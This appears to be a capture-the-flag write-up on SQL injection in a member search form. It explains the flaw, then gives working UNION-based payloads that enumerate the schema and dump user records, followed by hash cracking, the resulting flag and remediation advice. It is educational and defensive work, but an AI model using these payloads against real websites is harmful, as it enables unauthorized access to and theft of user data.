# SQL Injection - Member Search

## Breach Type
**SQL Injection (SQLi)** — OWASP Top 10: A03:2021 Injection

## What is this Vulnerability?
**SQL Injection** is a code injection technique that exploits a security vulnerability in an application's database layer. It occurs when user input is inserted into SQL queries **without proper sanitization or parameterization**.

In simple terms: the application builds a SQL query by concatenating the user's input directly into the query string. For example:
```php
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
```
If a user enters `1`, the query becomes `SELECT * FROM users WHERE id = 1` — normal behavior. But if they enter `1 UNION SELECT password FROM users`, the database runs a completely different query and returns sensitive data.

### Why is it dangerous?
- **Data theft**: An attacker can read the entire database — usernames, passwords, emails, credit cards
- **Authentication bypass**: Login forms can be bypassed with `' OR 1=1 --`
- **Data manipulation**: Attackers can INSERT, UPDATE, or DELETE records
- **Remote code execution**: In some cases, attackers can read files from the server (`LOAD_FILE()`) or even execute system commands
- **Full server compromise**: From database access, attackers can pivot to the underlying OS

### Real-world impact
SQL Injection has caused some of the largest breaches in history (Sony PlayStation Network — 77M accounts, LinkedIn — 6.5M passwords, Yahoo — 3B accounts). It consistently ranks as one of the most critical web vulnerabilities in the OWASP Top 10.

## Where
URL: `http://<IP>/?page=member`
The "Search member by ID" form on the Members page.

## How I Found It
1. Navigated to the **Members** page (`?page=member`).
2. Noticed a search form that takes an `id` parameter via GET.
3. Entered `1 OR 1=1` — this returned **all users** instead of just one, confirming the SQL injection.

## Step-by-Step Exploitation

### Step 1: Confirm SQL Injection
```
Input: 1 OR 1=1
```
Result: All 4 users returned (one, two, three, Flag/GetThe).

### Step 2: Find Number of Columns (UNION SELECT)
```
Input: 1 UNION SELECT 1,2
```
Result: Shows "First name: 1" and "Surname: 2" — confirms **2 columns**.

### Step 3: Enumerate Database Tables
```
Input: 1 UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()
```
Result: Found table `users` with columns: `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`.

### Step 4: Dump User Data
```
Input: 1 UNION SELECT CONCAT(user_id,0x7c,first_name,0x7c,last_name),CONCAT(Commentaire,0x7c,countersign) FROM users
```
Result: Found user ID 5:
- First name: `Flag`, Last name: `GetThe`
- Comment: `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
- Countersign: `5ff9d0165b4f92b14994e5c685cdce28`

### Step 5: Crack the MD5 Hash
The hash `5ff9d0165b4f92b14994e5c685cdce28` is MD5. Using an MD5 decryptor:
```
5ff9d0165b4f92b14994e5c685cdce28 → FortyTwo
```

### Step 6: Apply Instructions to Get the Flag
1. Lowercase: `FortyTwo` → `fortytwo`
2. SHA-256:
```bash
echo -n "fortytwo" | sha256sum
```
Result: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## Flag
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## How to Test Manually
1. Open your browser and go to `http://<IP>/?page=member`
2. In the search box, type: `1 OR 1=1` → Click Submit → See all users
3. Type: `1 UNION SELECT 1,2` → Confirms 2 columns
4. Type: `1 UNION SELECT CONCAT(user_id,0x7c,first_name,0x7c,last_name),CONCAT(Commentaire,0x7c,countersign) FROM users` → See all user data
5. Copy the hash from user 5, decrypt it (use https://md5.gromweb.com/), lowercase it, SHA-256 it

## How to Fix
- Use **prepared statements** (parameterized queries) instead of string concatenation
- Use an **ORM** (Object-Relational Mapping)
- Validate and sanitize user input (whitelist numeric IDs)
- Apply **least privilege** principle to database users
- Use a **WAF** (Web Application Firewall)

## OWASP Reference
- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
